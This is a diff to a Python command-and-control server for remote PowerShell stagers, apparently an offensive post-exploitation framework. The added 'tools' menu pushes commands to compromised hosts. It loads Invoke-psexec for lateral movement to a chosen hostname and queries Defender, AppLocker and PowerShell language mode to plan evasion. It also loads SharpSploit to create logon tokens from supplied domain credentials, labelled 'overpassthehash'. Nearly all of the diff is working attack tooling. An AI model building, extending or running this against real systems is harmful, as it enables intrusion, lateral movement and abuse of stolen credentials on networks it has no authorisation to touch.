@@ -29,6 +29,11 @@ def setautocomplete(words):
 def removecomplete():
     readline.set_completer()
 
+class SocketShutdown(Exception):
+    pass
+
+
+
 class myconstant():
     def __init__(self):
 
@@ -42,6 +47,7 @@ class myconstant():
         self.TAG_PIPE_LISTENER = "[Pipe Listener]"
         self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"
         self.TAG_PAYLOAD = "[Payload]"
+        self.TAG_STAGER_TOOLS = "[Tools]"
 
 
         self.CMD_USELISTENER = "uselistener"
@@ -71,9 +77,22 @@ class myconstant():
         self.CMD_STAGER_LOAD_PS = "psload"
         self.CMD_STAGER_CON = "connect"
         self.CMD_STAGER_PFW = "pfw"
+        self.CMD_STAGER_BUILDIN = "tools"
         #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
-        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
-                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW]
+        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_RUNNING_LIST,self.CMD_STAGER_GET_INTO,
+                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN]
+
+        self.CMD_STAGER_TOOLS_PSEXEC = "psexec"
+        self.CMD_STAGER_TOOLS_IF64BIT = "if64"
+        self.CMD_STAGER_TOOLS_GETNETVERSION = "getnet"
+        self.CMD_STAGER_TOOLS_GETAV = "getav"
+        self.CMD_STAGER_TOOLS_GETAL = "getal"
+        self.CMD_STAGER_TOOLS_GETCLM = "getclm"
+        self.CMD_STAGER_TOOLS_MAKETOKEN = "maketoken"
+        
+        self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_TOOLS_PSEXEC,self.CMD_STAGER_TOOLS_IF64BIT,
+                                            self.CMD_STAGER_TOOLS_GETNETVERSION,self.CMD_STAGER_TOOLS_GETAV,self.CMD_STAGER_TOOLS_GETAL,
+                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN]
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -118,6 +137,11 @@ class mybuildin_cmd():
         self.GETDEFENDER = "Get-MpComputerStatus"
         self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
         self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"
+
+        #overpassthehash
+        self.OPH_INIT = "$token = [SharPsplOit.Credentials.Tokens]::new()"
+        self.OPH_NEWTOKEN = "$token.MakeToken(\"{}\",\"{}\",\"{}\")"
+
 
 
 class ps_loader():
@@ -207,6 +231,8 @@ class mysocket_handler():
                 try: 
                     t_indata = self.__mysocket.recv(1024)
                     self.__msg_buf = self.__msg_buf + t_indata.decode("utf8", "ignore")
+                    if len(t_indata) == 0:
+                        raise SocketShutdown("Client side shutdown ...")
                 except socket.timeout:
                     pass
     def get_native_all(self):
@@ -229,7 +255,8 @@ class myserver():
         self.__mysocket_list = dict()
         self.__mydata_list = dict() #Que to runner
         self.__myaddr_list = dict() #this is port + ip
-        self.__mymsg_list = dict()
+        self.__mymsg_list = dict() #history message
+        self.__mypsloader_list = dict() #loaded ps module
         self.__myuuid_list = list()
         self.__mystart_list = dict() #bool
         self.__myfwdata_list_tomaster = dict()
@@ -559,6 +586,11 @@ class myserver():
         self.__myuuid_list.append(myuuid)
         #set start
         self.__mystart_list[myuuid] = True
+
+        #init psloader
+        self.__mypsloader_list[myuuid] = list()
+
+
         print("[Client] myuuid is {}".format(myuuid))
         threading.Thread(target=self.start_worker,args=(myuuid,)).start()
 
@@ -635,6 +667,9 @@ class myserver():
                 self.__myfwdata_list_tomaster[myuuid] = queue.Queue()
                 self.__myfwdata_list_torh[myuuid] = queue.Queue()
                 self.__myfwdata_list_fromrh[myuuid] = queue.Queue()
+
+                #init psloader
+                self.__mypsloader_list[myuuid] = list()
 
                 print("[Listener] myuuid is {}".format(myuuid))
                 threading.Thread(target=self.start_worker,args=(myuuid,)).start()
@@ -790,6 +825,17 @@ class myserver():
         assert(type(pipename) is str)
         self.__pipename = pipename
 
+
+    def add_psloadlist(self,myuuid,filename): #push the filename to list
+        self.__mypsloader_list[myuuid].append(filename)
+    
+    def get_psloadlist(self,myuuid):
+        return self.__mypsloader_list[myuuid]
+    
+    def print_psloadlist(self,myuuid):
+        print("List of loaded script: {}".format(self.__mypsloader_list[myuuid]))
+
+
 #to hold some config for payloadgen
 class mypayload():
     def __init__(self):
@@ -817,6 +863,7 @@ class mymainclass():
         self.__t_myserver = myserver()
         self.__t_net_constant = myconstant_networking()
         self.__t_mypayload = mypayload()
+        self.__t_mybuildin = mybuildin_cmd()
 
     def __cmd_list_main(self):
         print("\n+++++++++++++++++++++++++++++++++++")
@@ -847,6 +894,7 @@ class mymainclass():
         print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
         print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
         print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
+        print(self.__t_myconstant.CMD_STAGER_BUILDIN + ": Buildin tools")
         print("+++++++++++++++++++++++++++++++++++\n")
     
     def __cmd_list_payload(self):
@@ -882,6 +930,8 @@ class mymainclass():
                 setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
             if cmd_tag == self.__t_myconstant.TAG_PAYLOAD:
                 setautocomplete(self.__t_myconstant.CMD_PAYLOAD_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
+                setautocomplete(self.__t_myconstant.CMD_STAGER_TOOLS_AUTOLIST)
             
 
             user_input = input(cmd_tag + "> ")
@@ -970,6 +1020,10 @@ class mymainclass():
                     cmd_tag = self.__t_myconstant.TAG_MYCS
                     continue
                 
+                if command_id == self.__t_myconstant.CMD_STAGER_BUILDIN:
+                    cmd_tag = self.__t_myconstant.TAG_STAGER_TOOLS
+                    continue
+
                 if command_id == self.__t_myconstant.CMD_HELP:
                     self.__cmd_list_stager()
                     continue
@@ -997,10 +1051,10 @@ class mymainclass():
 
                 if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
                     #set auto compete to stager uuid
-                    setautocomplete(self.__t_myserver.get_stager())
+                    setautocomplete(self.__t_myserver.get_running_stager())
 
                     user_input_stager = input("Please enter the stager uuid: ")
-                    if user_input_stager not in self.__t_myserver.get_stager():
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
                         print("Please input a valid stager uuid")
                         continue
 
@@ -1013,10 +1067,10 @@ class mymainclass():
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_LOAD_PS:
                     #set auto compete to stager uuid
-                    setautocomplete(self.__t_myserver.get_stager())
+                    setautocomplete(self.__t_myserver.get_running_stager())
 
                     user_input_stager = input("Please enter the stager uuid: ")
-                    if user_input_stager not in self.__t_myserver.get_stager():
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
                         print("Please input a valid stager uuid")
                         continue
 
@@ -1024,9 +1078,19 @@ class mymainclass():
                     #set auto compete for filename
                     setautocomplete(t_psloader.psfiles)
                     user_input_psfile = input("Please enter psfile to load: ")
-                    t_result = t_psloader.load_ps(user_input_psfile)
-                    #call psrun with tag psload
-                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    if (user_input_psfile not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        t_result = t_psloader.load_ps(user_input_psfile)
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,user_input_psfile)
+                    else:
+                        print("{} is already loaded".format(user_input_psfile))
+                
+                    continue
+
 
                 if command_id == self.__t_myconstant.CMD_STAGER_CON:
                     #unset auto complete
@@ -1035,13 +1099,14 @@ class mymainclass():
                     user_input_host = input("Please enter target ip: ")
                     user_input_port = input("Please enter target port: ")
                     self.__t_myserver.start_client(user_input_host,int(user_input_port))
+                    continue
 
                 if command_id ==  self.__t_myconstant.CMD_STAGER_PFW:
                     #set auto compete to stager uuid
-                    setautocomplete(self.__t_myserver.get_stager())
+                    setautocomplete(self.__t_myserver.get_running_stager())
 
                     user_input_stager = input("Please enter the stager uuid: ")
-                    if user_input_stager not in self.__t_myserver.get_stager():
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
                         print("Please input a valid stager uuid")
                         continue
 
@@ -1061,6 +1126,129 @@ class mymainclass():
                         threading.Thread(target=self.__t_myserver.start_slave_worker,args=(user_input_stager,)).start()
                     else:
                         print("Cannot connect to local resource")
+
+            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
+                    continue
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSEXEC:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    t_mypayloadgen.gen_psexec()
+
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Invoke-psexec.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname to jump to: ")
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"stop \\\\{}\"".format(user_input_target))
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"start \\\\{}\"".format(user_input_target))
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_IF64BIT:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.IF64BIT)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETNETVERSION:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETCLM:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETLANGMODE)
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETAV:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDEFENDER)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETAL:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETAPPLOCKER)
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MAKETOKEN:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-SharpSploit.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-SharpSploit.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-SharpSploit.ps1")
+                    
+                    else:
+                        print("SharpSploit already loaded")
+
+                    user_input_domain = input("Please enter target domain: ")
+                    user_input_username = input("Please enter username: ")
+                    user_input_password = input("Please enter password: ")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
+                    continue
+
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
